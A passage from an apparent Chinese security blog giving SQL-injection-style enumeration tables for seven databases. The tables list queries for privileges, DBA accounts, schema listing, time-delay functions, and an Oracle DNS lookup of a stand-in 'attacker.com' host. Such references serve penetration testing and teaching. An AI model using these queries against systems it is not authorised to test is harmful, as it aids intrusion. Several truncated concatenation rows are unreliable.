<td>select versionnumber, version_timestamp from sysibm.sysversions</td>
<td>-</td>
</tr>
<tr>
<td>当前用户</td>
<td>select user from sysibm.sysdummy1</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>select session_user from sysibm.sysdummy1</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>select system_user from sysibm.sysdummy1</td>
<td>-</td>
</tr>
<tr>
<td>用户权限</td>
<td>select * from syscat.tabauth</td>
<td>管理员才能运行</td>
</tr>
<tr>
<td>-</td>
<td>select * from syscat.dbauth where grantee = 当前用户</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>select * from syscat.tabauth where grantee = 当前用户</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>select * from SYSIBM.SYSUSERAUTH</td>
<td>列出DB2系统权限</td>
</tr>
<tr>
<td>列出DBA账户</td>
<td>select name from SYSIBM.SYSUSERAUTH where SYSADMAUTH = ‘Y’ or SYSADMAUTH = ‘G’</td>
<td>-</td>
</tr>
<tr>
<td>选择第N行</td>
<td>select name from (SELECT name FROM sysibm.systables order by name fetch first N+M-1 rows only) sq order by name desc fetch first N rows only</td>
<td>-</td>
</tr>
<tr>
<td>选择第N个字符</td>
<td>SELECT SUBSTR(‘abc’,2,1) FROM sysibm.sysdummy1</td>
<td>返回b</td>
</tr>
<tr>
<td>ASCII值-字符</td>
<td>select chr(65) from sysibm.sysdummy1</td>
<td>返回A</td>
</tr>
<tr>
<td>字符-ASCII值</td>
<td>select ascii(‘A’) from sysibm.sysdummy1</td>
<td>返回65</td>
</tr>
<tr>
<td>字符串连接</td>
<td>SELECT ‘a’ concat ‘b’ concat ‘c’ FROM sysibm.sysdummy1</td>
<td>返回abc</td>
</tr>
<tr>
<td>-</td>
<td>select ‘a’</td>
<td></td>
</tr>
</tbody></table>
<h2 id="0x082-MySQL数据库"><a href="#0x082-MySQL数据库" class="headerlink" title="0x082 MySQL数据库"></a>0x082 MySQL数据库</h2><table>
<thead>
<tr>
<th>释义</th>
<th>SQL语句</th>
<th>其他</th>
</tr>
</thead>
<tbody><tr>
<td>当前数据库</td>
<td>SELECT database()</td>
<td>-</td>
</tr>
<tr>
<td>所有数据库</td>
<td>SELECT schema_name FROM information_schema.schemata</td>
<td>版本&gt;5.0</td>
</tr>
<tr>
<td>\-</td>
<td>SELECT distinct(db) FROM mysql.db</td>
<td>管理员权限才可以执行</td>
</tr>
<tr>
<td>查询表名</td>
<td>SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’</td>
<td>-</td>
</tr>
<tr>
<td>查询列名</td>
<td>SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’</td>
<td>-</td>
</tr>
<tr>
<td>获取版本</td>
<td>SELECT @@version</td>
<td>-</td>
</tr>
<tr>
<td>当前用户</td>
<td>SELECT user()</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>SELECT system_user()</td>
<td>-</td>
</tr>
<tr>
<td>用户权限</td>
<td>SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges</td>
<td>用户权限</td>
</tr>
<tr>
<td>-</td>
<td>SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges</td>
<td>数据库权限</td>
</tr>
<tr>
<td>-</td>
<td>SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges</td>
<td>字段的权限</td>
</tr>
<tr>
<td>列出DBA账户</td>
<td>SELECT host, user FROM mysql.user WHERE Super_priv = ‘Y’</td>
<td>-</td>
</tr>
<tr>
<td>选择第N行</td>
<td>SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0</td>
<td>行从0开始编号</td>
</tr>
<tr>
<td>-</td>
<td>SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 1</td>
<td>行从0开始编号</td>
</tr>
<tr>
<td>选择第N个字符</td>
<td>SELECT substr(‘abcd’, 3, 1)</td>
<td>返回c</td>
</tr>
<tr>
<td>ASCII值-字符</td>
<td>SELECT char(65)</td>
<td>返回A</td>
</tr>
<tr>
<td>字符-ASCII值</td>
<td>SELECT ascii(‘A’)</td>
<td>返回65</td>
</tr>
<tr>
<td>字符串连接</td>
<td>SELECT CONCAT(‘A’,’B’)</td>
<td>返回AB</td>
</tr>
<tr>
<td>-</td>
<td>SELECT CONCAT(‘A’,’B’,’C’)</td>
<td>返回ABC</td>
</tr>
<tr>
<td>时间睡眠</td>
<td>SELECT BENCHMARK(1000000,MD5(‘A’))</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>SELECT SLEEP(5)</td>
<td>版本&gt;= 5.0.12</td>
</tr>
</tbody></table>
<h2 id="0x083-Oracle数据库"><a href="#0x083-Oracle数据库" class="headerlink" title="0x083 Oracle数据库"></a>0x083 Oracle数据库</h2><table>
<thead>
<tr>
<th>释义</th>
<th>SQL语句</th>
<th>其他</th>
</tr>
</thead>
<tbody><tr>
<td>当前数据库</td>
<td>SELECT global_name FROM global_name</td>
<td>—</td>
</tr>
<tr>
<td>-</td>
<td>SELECT name FROM v$database</td>
<td>—</td>
</tr>
<tr>
<td>-</td>
<td>SELECT instance_name FROM v$instance</td>
<td>—</td>
</tr>
<tr>
<td>-</td>
<td>SELECT SYS.DATABASE_NAME FROM DUAL</td>
<td>—</td>
</tr>
<tr>
<td>所有数据库</td>
<td>SELECT DISTINCT owner FROM all_tables</td>
<td>—</td>
</tr>
<tr>
<td>查询表名</td>
<td>SELECT table_name FROM all_tables</td>
<td>—</td>
</tr>
<tr>
<td>-</td>
<td>SELECT owner, table_name FROM all_tables</td>
<td>—</td>
</tr>
<tr>
<td>查询列名</td>
<td>SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’</td>
<td>—</td>
</tr>
<tr>
<td>-</td>
<td>SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’ and owner = ‘foo’</td>
<td>—</td>
</tr>
<tr>
<td>获取版本</td>
<td>SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’</td>
<td>—</td>
</tr>
<tr>
<td>-</td>
<td>SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’</td>
<td>—</td>
</tr>
<tr>
<td>-</td>
<td>SELECT version FROM v$instance</td>
<td>—</td>
</tr>
<tr>
<td>当前用户</td>
<td>SELECT user FROM dual</td>
<td>—</td>
</tr>
<tr>
<td>用户权限</td>
<td>SELECT * FROM session_privs</td>
<td>当前权限</td>
</tr>
<tr>
<td>-</td>
<td>SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’</td>
<td>列出用户的权限</td>
</tr>
<tr>
<td>列出DBA账户</td>
<td>SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’</td>
<td>—</td>
</tr>
<tr>
<td>选择第N行</td>
<td>SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9</td>
<td>第九行</td>
</tr>
<tr>
<td>选择第N个字符</td>
<td>SELECT substr(‘abcd’, 3, 1) FROM dual</td>
<td>第3个字符c</td>
</tr>
<tr>
<td>ASCII值-字符</td>
<td>SELECT chr(65) FROM dual</td>
<td>返回A</td>
</tr>
<tr>
<td>字符-ASCII值</td>
<td>SELECT ascii(‘A’) FROM dual</td>
<td>返回65</td>
</tr>
<tr>
<td>字符串连接</td>
<td>SELECT ‘A’</td>
<td></td>
</tr>
<tr>
<td>时间睡眠</td>
<td>SELECT UTL_INADDR.get_host_name(‘10.0.0.1’) FROM dual</td>
<td>如果反向查询很慢</td>
</tr>
<tr>
<td>-</td>
<td>SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual</td>
<td>如果正向查询很慢</td>
</tr>
</tbody></table>
<h2 id="0x084-MSSQL数据库"><a href="#0x084-MSSQL数据库" class="headerlink" title="0x084 MSSQL数据库"></a>0x084 MSSQL数据库</h2><table>
<thead>
<tr>
<th>释义</th>
<th>SQL语句</th>
<th>其他</th>
</tr>
</thead>
<tbody><tr>
<td>当前数据库</td>
<td>SELECT DB_NAME()</td>
<td>-</td>
</tr>
<tr>
<td>所有数据库</td>
<td>SELECT name FROM master..sysdatabases</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>SELECT DB_NAME(N)</td>
<td>N为0,1,2,…</td>
</tr>
<tr>
<td>查询表名</td>
<td>SELECT name FROM master..sysobjects WHERE xtype = ‘U’</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>SELECT name FROM someotherdb..sysobjects WHERE xtype = ‘U’</td>
<td>-</td>
</tr>
<tr>
<td>查询列名</td>
<td>SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’)</td>
<td>当前数据库</td>
</tr>
<tr>
<td>-</td>
<td>SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’</td>
<td>列出master..sometable的列名称</td>
</tr>
<tr>
<td>获取版本</td>
<td>SELECT @@version</td>
<td>-</td>
</tr>
<tr>
<td>当前用户</td>
<td>SELECT user_name()</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>SELECT system_user</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>SELECT user</td>
<td>-</td>
</tr>
<tr>
<td>用户权限</td>
<td>SELECT permission_name FROM master..fn_my_permissions(null,‘DATABASE’)</td>
<td>当前数据库权限</td>
</tr>
<tr>
<td>-</td>
<td>SELECT is_srvrolemember(‘sysadmin’)</td>
<td>当前用户权限</td>
</tr>
<tr>
<td>列出DBA账户</td>
<td>SELECT is_srvrolemember(‘sysadmin’)</td>
<td>当前用户是否是管理员，是则返回1</td>
</tr>
<tr>
<td>选择第N行</td>
<td>SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC</td>
<td>返回第九行</td>
</tr>
<tr>
<td>选择第N个字符</td>
<td>SELECT substring(‘abcd’, 3, 1)</td>
<td>返回c</td>
</tr>
<tr>
<td>ASCII值-字符</td>
<td>SELECT char(0×41)</td>
<td>返回A</td>
</tr>
<tr>
<td>字符-ASCII值</td>
<td>SELECT ascii(‘A’)</td>
<td>返回65</td>
</tr>
<tr>
<td>字符串连接</td>
<td>SELECT ‘A’ + ‘B’</td>
<td>返回AB</td>
</tr>
<tr>
<td>时间睡眠</td>
<td>WAITFOR DELAY ‘0:0:5’</td>
<td>睡眠5秒</td>
</tr>
</tbody></table>
<h2 id="0x085-PostgreSQL数据库"><a href="#0x085-PostgreSQL数据库" class="headerlink" title="0x085 PostgreSQL数据库"></a>0x085 PostgreSQL数据库</h2><table>
<thead>
<tr>
<th>释义</th>
<th>SQL语句</th>
<th>其他</th>
</tr>
</thead>
<tbody><tr>
<td>当前数据库</td>
<td>SELECT current_database()</td>
<td>-</td>
</tr>
<tr>
<td>所有数据库</td>
<td>SELECT datname FROM pg_database</td>
<td>-</td>
</tr>
<tr>
<td>查询表名</td>
<td>SELECT relname, A.attname FROM pg_class C, pg_namespace N,pg_attribute A, pg_type T WHERE (C.relkind=’r’) AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum&gt;0) AND (NOT A.attisdropped) AND (N.nspname ILIKE ‘public’)</td>
<td>-</td>
</tr>
<tr>
<td>查询列名</td>
<td>SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN (‘r’,”) AND n.nspname NOT IN (‘pg_catalog’, ‘pg_toast’) AND pg_catalog.pg_table_is_visible(c.oid)</td>
<td>-</td>
</tr>
<tr>
<td>获取版本</td>
<td>SELECT version()</td>
<td>-</td>
</tr>
<tr>
<td>当前用户</td>
<td>SELECT user;</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>SELECT current_user;</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>SELECT session_user;</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>SELECT usename FROM pg_user;</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>SELECT getpgusername();</td>
<td>-</td>
</tr>
<tr>
<td>用户权限</td>
<td>SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user</td>
<td>-</td>
</tr>
<tr>
<td>列出DBA账户</td>
<td>SELECT usename FROM pg_user WHERE usesuper IS TRUE</td>
<td>-</td>
</tr>
<tr>
<td>选择第N行</td>
<td>SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 0</td>
<td>从0行开始编号</td>
</tr>
<tr>
<td>-</td>
<td>SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 1;</td>
<td>-</td>
</tr>
<tr>
<td>选择第N个字符</td>
<td>SELECT substr(‘abcd’, 3, 1)</td>
<td>返回c</td>
</tr>
<tr>
<td>ASCII值-字符</td>
<td>SELECT chr(65)</td>
<td>返回A</td>
</tr>
<tr>
<td>字符-ASCII值</td>
<td>SELECT ascii(‘A’)</td>
<td>返回65</td>
</tr>
<tr>
<td>字符串连接</td>
<td>SELECT ‘A’</td>
<td></td>
</tr>
<tr>
<td>时间睡眠</td>
<td>SELECT pg_sleep(10)</td>
<td>睡眠10秒</td>
</tr>
<tr>
<td>-</td>
<td>SELECT sleep(10)</td>
<td>创建自定义睡眠</td>
</tr>
</tbody></table>
<h2 id="0x086-Ingres数据库"><a href="#0x086-Ingres数据库" class="headerlink" title="0x086 Ingres数据库"></a>0x086 Ingres数据库</h2><table>
<thead>
<tr>
<th>释义</th>
<th>SQL语句</th>
<th>其他</th>
</tr>
</thead>
<tbody><tr>
<td>当前数据库</td>
<td>select dbmsinfo(‘database’);</td>
<td>-</td>
</tr>
<tr>
<td>所有数据库</td>
<td>SELECT name FROM iidatabase</td>
<td>连接到数据库</td>
</tr>
<tr>
<td>查询表名</td>
<td>select table_name, table_owner from iitables;</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>select relid, relowner, relloc from iirelation;</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>select relid, relowner, relloc from iirelation where relowner != ‘$ingres’;</td>
<td>-</td>
</tr>
<tr>
<td>查询列名</td>
<td>select column_name, column_datatype, table_name, table_owner from iicolumns;</td>
<td>-</td>
</tr>
<tr>
<td>获取版本</td>
<td>select dbmsinfo(‘_version’)</td>
<td>-</td>
</tr>
<tr>
<td>当前用户</td>
<td>select dbmsinfo(‘session_user’)</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>select dbmsinfo(‘system_user’)</td>
<td>-</td>
</tr>
<tr>
<td>用户权限</td>
<td>select dbmsinfo(‘db_admin’)</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>select dbmsinfo(‘create_table’)</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>select dbmsinfo(‘create_procedure’)</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>select dbmsinfo(‘security_priv’)</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>select dbmsinfo(‘select_syscat’)</td>
<td>-</td>
</tr>
<tr>
<td>选择第N行</td>
<td>select first 10 blah form table</td>
<td>选择前10位的表</td>
</tr>
<tr>
<td>选择第N个字符</td>
<td>select substr(‘abc’, 2, 1)</td>
<td>返回b</td>
</tr>
<tr>
<td>ASCII值-字符</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>字符-ASCII值</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>字符串连接</td>
<td>select ‘abc’</td>
<td></td>
</tr>
<tr>
<td>时间睡眠</td>
<td>-</td>
<td>-</td>
</tr>
</tbody></table>
<h2 id="0x087-Infomix数据库"><a href="#0x087-Infomix数据库" class="headerlink" title="0x087 Infomix数据库"></a>0x087 Infomix数据库</h2><table>
<thead>
<tr>
<th>释义</th>
<th>SQL语句</th>
<th>其他</th>
</tr>
</thead>
<tbody><tr>
<td>当前数据库</td>
<td>SELECT DBSERVERNAME FROM systables where tabid = 1</td>
<td>-</td>
</tr>
<tr>
<td>所有数据库</td>
<td>select name, owner from sysdatabases;</td>
<td>-</td>
</tr>
<tr>
<td>查询表名</td>
<td>select tabname, owner FROM systables;</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>select tabname, viewtext FROM sysviews join systables on systables.tabid = sysviews.tabid;</td>
<td>-</td>
</tr>
<tr>
<td>查询列名</td>
<td>select tabname, colname, owner, coltype FROM syscolumns join systables on syscolumns.tabid = systables.tabid;</td>
<td>-</td>
</tr>
<tr>
<td>获取版本</td>
<td>SELECT DBINFO(‘version’, ‘full’) FROM systables WHERE tabid = 1</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>SELECT DBINFO(‘version’, ‘server-type’) FROM systables WHERE tabid = 1</td>
<td>-</td>
</tr>
<tr>
<td>当前用户</td>
<td>SELECT USER FROM systables WHERE tabid = 1</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>select CURRENT_ROLE FROM systables WHERE tabid = 1</td>
<td>-</td>
</tr>
<tr>
<td>用户权限</td>
<td>select procname, owner, grantor, grantee from sysprocauth join sysprocedures on sysprocauth.procid = sysprocedures.procid</td>
<td>哪些用户可以访问哪些程序</td>
</tr>
<tr>
<td>选择第N行</td>
<td>select first 1 tabid from (select first 10 tabid from systables order by tabid) as sq order by tabid desc</td>
<td>选择第10行</td>
</tr>
<tr>
<td>选择第N个字符</td>
<td>SELECT SUBSTRING(‘ABCD’ FROM 3 FOR 1) FROM systables where tabid = 1</td>
<td>返回C</td>
</tr>
<tr>
<td>ASCII值-字符</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>字符-ASCII值</td>
<td>select ascii(‘A’) from systables where tabid = 1</td>
<td>返回65</td>
</tr>
<tr>
<td>字符串连接</td>
<td>SELECT ‘A’</td>
<td></td>
</tr>
<tr>
<td>-</td>
<td>SELECT concat(‘A’, ‘B’) FROM systables where tabid = 1</td>
<td>返回AB</td>
</tr>
<tr>
<td>时间睡眠</td>
<td>-</td>
<td>-</td>
</tr>
</tbody></table>

</div>


    <div class="post-guide">
        <div class="item left">
            
              <a href="/2021/04/12/%E6%B1%87%E7%BC%96/%E9%80%9A%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8/">
                  <i class="fa fa-angle-left" aria-hidden="true"></i>
                  通用寄存器
              </a>
            
        </div>
        <div class="item right">
            
              <a href="/2021/04/12/Linux/%E5%8D%8A%E8%99%9A%E6%8B%9F%E5%8C%96%E5%92%8C%E7%A1%AC%E4%BB%B6%E8%99%9A%E6%8B%9F%E5%8C%96%E7%9A%84%E4%B8%BB%E8%A6%81%E5%8C%BA%E5%88%AB/">
                半虚拟化和硬件虚拟化的主要区别
                <i class="fa fa-angle-right" aria-hidden="true"></i>
              </a>
            
        </div>
    </div>




<script>
	
	
</script>
	</div>
	<div id="footer">
	<p>
	©2020-<span id="footerYear"></span> 
	<a href="/">BamB00</a> 
	
	
		|
		<span id="busuanzi_container_site_pv">
			pv
			<span id="busuanzi_value_site_pv"></span>
		</span>
		|
		<span id="busuanzi_container_site_uv"> 
			uv
			<span id="busuanzi_value_site_uv"></span>
		</span>
	
	<br>
	Theme <a href="//github.com/wujun234/hexo-theme-tree" target="_blank">Tree</a>
	by <a href="//github.com/wujun234" target="_blank">WuJun</a>
	Powered by <a href="//hexo.io" target="_blank">Hexo</a>
	</p>
</div>
<script type="text/javascript"> 
	document.getElementById('footerYear').innerHTML = new Date().getFullYear() + '';
</script>
	<button id="totop-toggle" class="toggle"><i class="fa fa-angle-double-up" aria-hidden="true"></i></button>
</body>
</html>